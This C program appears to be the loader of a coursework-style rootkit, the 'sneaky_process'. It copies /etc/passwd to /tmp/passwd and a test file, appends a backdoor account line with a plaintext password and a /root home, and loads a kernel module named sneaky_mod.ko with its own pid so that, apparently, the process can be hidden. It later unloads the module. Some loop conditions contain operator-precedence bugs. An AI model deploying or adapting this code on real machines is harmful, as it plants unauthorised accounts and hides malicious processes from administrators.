#include <linux/module.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>

int main() {
  printf("sneaky_process pid = % d\n", getpid());

  FILE * f = fopen("/etc/passwd", "r");
  FILE * fd = fopen("/tmp/passwd", "w");
  FILE * fdd = fopen("test.txt", "w");

  size_t sz = 0;
  ssize_t len = 0;
  char * line = NULL;

  while (len = (getline(&line, &sz, f)) >= 0) {
    printf("%s", line);
    fprintf(fd, "%s", line);
    fprintf(fdd, "%s", line);
  }

  fprintf(fd, "%s", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
  fprintf(fdd, "%s", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
  free(line);
  fclose(f);
  fclose(fd);
  fclose(fdd);

  char insn1[42];
  sprintf(insn1, "insmod sneaky_mod.ko pid=%d", getpid());
  system(insn1);
  char q;

  while (q = (getchar()) != 'q') {
    continue;
  }
  system("rmmod sneaky_mod");
}
